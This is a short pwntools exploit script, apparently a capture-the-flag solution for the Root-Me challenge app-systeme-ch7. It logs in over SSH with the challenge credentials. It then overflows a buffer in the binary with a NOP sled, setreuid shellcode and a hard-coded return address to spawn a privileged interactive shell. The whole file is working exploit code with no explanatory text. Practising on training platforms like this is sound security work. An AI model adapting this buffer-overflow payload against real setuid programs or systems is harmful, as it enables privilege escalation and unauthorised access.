from pwn import *

shell = ssh(host='challenge02.root-me.org',
        user='app-systeme-ch7',
        password='app-systeme-ch7',
        port=2222)


shellcode = asm(shellcraft.setreuid(1207))
shellcode += asm(shellcraft.sh())
payload = b''
payload += (512 - len(shellcode)) * b'\x90'
payload += shellcode

addr = 0x0804a040
payload += p32(addr)


p = shell.process(['./ch7', payload])
p.interactive()
